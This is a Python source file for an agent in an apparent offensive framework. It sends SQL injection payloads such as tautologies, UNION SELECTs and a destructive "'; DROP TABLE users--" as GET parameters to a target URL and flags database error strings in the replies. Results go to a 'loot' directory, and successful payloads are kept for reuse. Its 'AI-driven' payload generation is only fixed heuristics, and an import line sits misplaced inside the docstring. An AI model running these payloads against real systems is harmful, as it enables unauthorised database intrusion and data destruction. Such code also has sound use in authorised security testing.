#!/usr/bin/env python3
"""
from core.logger import log
SQLMapAgent - AI-Powered SQL Injection Detection Agent
Advanced SQL injection testing with AI-driven payload generation
"""

import asyncio
import aiohttp
import random
import time
from typing import Dict, List, Any, Optional
from pathlib import Path
import json

from core.base_agent import BaseAgent
from core.data_models import AttackPhase
from core.data_models import TargetInfo as Target


class SQLMapAgent(BaseAgent):
    """Advanced AI-Powered SQL Injection Detection Agent"""
    
    def __init__(self, context_manager=None, orchestrator=None):
        super().__init__(context_manager, orchestrator)
        self.name = "SQLMapAgent"
        self.description = "AI-Powered SQL Injection Detection Agent"
        self.version = "2.0.0"
        self.supported_phases = [AttackPhase.VULNERABILITY_DETECTION]
        self.ai_model = "mistral:latest"
        self.learning_data = {}
        self.results_dir = "workspace/loot/sqlmap"
        
        # SQL injection payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT NULL--",
            "' AND 1=1--",
            "' OR 1=1#",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "' OR 1=1 LIMIT 1--"
        ]
        
        # AI-generated payloads
        self.ai_payloads = []
        self.success_patterns = []
        
    async def initialize(self):
        """Initialize the agent"""
        await super().initialize()
        await self._initialize_ai_learning()
        
    async def _initialize_ai_learning(self):
        """Initialize AI learning capabilities"""
        try:
            # Load existing learning data
            learning_file = Path("workspace/sqlmap_learning.json")
            if learning_file.exists():
                with open(learning_file, "r") as f:
                    self.learning_data = json.load(f)
                    self.ai_payloads = self.learning_data.get("ai_payloads", [])
                    self.success_patterns = self.learning_data.get("success_patterns", [])
            
            log.info(f"SQLMapAgent AI learning initialized with {len(self.ai_payloads)} AI payloads")
            
        except Exception as e:
            log.warning(f"Failed to initialize AI learning: {e}")
    
    async def execute(self, target: Target, phase: AttackPhase, **kwargs) -> Dict[str, Any]:
        """Execute SQL injection detection"""
        try:
            log.info(f"Starting SQL injection detection on {target.url}")
            
            # AI-analyze target
            analysis = await self._ai_analyze_target(target)
            
            # Generate AI payloads
            ai_payloads = await self._generate_ai_payloads(target, analysis)
            
            # Combine with standard payloads
            all_payloads = self.sql_payloads + ai_payloads
            
            # Execute SQL injection tests
            results = await self._execute_sql_tests(target, all_payloads)
            
            # AI-learn from results
            await self._learn_from_results(target, results)
            
            return {
                "agent": self.name,
                "target": target.url,
                "phase": phase.value,
                "vulnerabilities": results.get("vulnerabilities", []),
                "ai_payloads_used": ai_payloads,
                "success_rate": results.get("success_rate", 0),
                "analysis": analysis
            }
            
        except Exception as e:
            log.error(f"SQLMapAgent execution failed: {e}")
            return {
                "agent": self.name,
                "target": target.url,
                "phase": phase.value,
                "error": str(e),
                "vulnerabilities": [],
                "ai_payloads_used": [],
                "success_rate": 0
            }
    
    async def _ai_analyze_target(self, target: Target) -> Dict[str, Any]:
        """AI-analyze target for optimal payload generation"""
        try:
            # Analyze target characteristics
            analysis = {
                "url_structure": target.url,
                "technology_stack": [],
                "sql_injection_indicators": [],
                "attack_vectors": []
            }
            
            # Simple heuristic analysis
            if "id=" in target.url or "user=" in target.url:
                analysis["sql_injection_indicators"].append("parameter_based")
                analysis["attack_vectors"].append("parameter_injection")
            
            if any(tech in target.url.lower() for tech in ["php", "asp", "jsp"]):
                analysis["technology_stack"].append("server_side")
                analysis["attack_vectors"].append("server_side_injection")
            
            return analysis
            
        except Exception as e:
            log.warning(f"AI analysis failed: {e}")
            return {"error": str(e)}
    
    async def _generate_ai_payloads(self, target: Target, analysis: Dict[str, Any]) -> List[str]:
        """Generate AI-driven payloads based on target analysis"""
        try:
            ai_payloads = []
            
            # Generate payloads based on technology stack
            for tech in analysis.get("technology_stack", []):
                if tech == "server_side":
                    ai_payloads.extend([
                        "' OR '1'='1' AND '1'='1",
                        "' UNION SELECT 1,2,3--",
                        "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
                    ])
            
            # Generate payloads based on attack vectors
            for vector in analysis.get("attack_vectors", []):
                if vector == "parameter_injection":
                    ai_payloads.extend([
                        "1' OR '1'='1",
                        "1' UNION SELECT NULL--",
                        "1' AND 1=1--"
                    ])
            
            # Add learned payloads
            ai_payloads.extend(self.ai_payloads[:10])  # Use top 10 learned payloads
            
            return list(set(ai_payloads))  # Remove duplicates
            
        except Exception as e:
            log.warning(f"AI payload generation failed: {e}")
            return []
    
    async def _execute_sql_tests(self, target: Target, payloads: List[str]) -> Dict[str, Any]:
        """Execute SQL injection tests"""
        try:
            vulnerabilities = []
            success_count = 0
            
            async with aiohttp.ClientSession() as session:
                for payload in payloads[:20]:  # Limit to 20 payloads for demo
                    try:
                        # Test with GET parameter
                        test_url = f"{target.url}?id={payload}"
                        
                        async with session.get(test_url, timeout=5) as response:
                            response_text = await response.text()
                            
                            # Check for SQL error indicators
                            sql_errors = [
                                "mysql_fetch_array",
                                "ORA-01756",
                                "Microsoft OLE DB Provider",
                                "SQLServer JDBC Driver",
                                "PostgreSQL query failed",
                                "Warning: mysql_",
                                "valid MySQL result",
                                "MySqlClient.",
                                "SQL syntax"
                            ]
                            
                            if any(error in response_text for error in sql_errors):
                                vulnerabilities.append({
                                    "type": "SQL Injection",
                                    "severity": "High",
                                    "description": f"SQL injection detected with payload: {payload}",
                                    "payload": payload,
                                    "url": test_url,
                                    "evidence": response_text[:200]
                                })
                                success_count += 1
                                log.info(f"SQL injection detected: {test_url}")
                        
                        # Rate limiting
                        await asyncio.sleep(0.1)
                        
                    except Exception as e:
                        continue
            
            success_rate = (success_count / len(payloads)) * 100 if payloads else 0
            
            return {
                "vulnerabilities": vulnerabilities,
                "success_rate": success_rate,
                "total_tested": len(payloads)
            }
            
        except Exception as e:
            log.error(f"SQL injection testing failed: {e}")
            return {"vulnerabilities": [], "success_rate": 0, "total_tested": 0}
    
    async def _learn_from_results(self, target: Target, results: Dict[str, Any]):
        """Learn from SQL injection results"""
        try:
            # Store successful patterns
            for vuln in results.get("vulnerabilities", []):
                payload = vuln.get("payload", "")
                if payload and payload not in self.success_patterns:
                    self.success_patterns.append(payload)
            
            # Update AI payloads based on success patterns
            self.ai_payloads = self.success_patterns[:20]  # Keep top 20
            
            # Save learning data
            self.learning_data = {
                "ai_payloads": self.ai_payloads,
                "success_patterns": self.success_patterns,
                "last_update": time.time()
            }
            
            learning_file = Path("workspace/sqlmap_learning.json")
            learning_file.parent.mkdir(exist_ok=True)
            
            with open(learning_file, "w") as f:
                json.dump(self.learning_data, f, indent=2)
            
            log.info(f"SQLMapAgent learned {len(self.ai_payloads)} new patterns")
            
        except Exception as e:
            log.warning(f"Learning failed: {e}")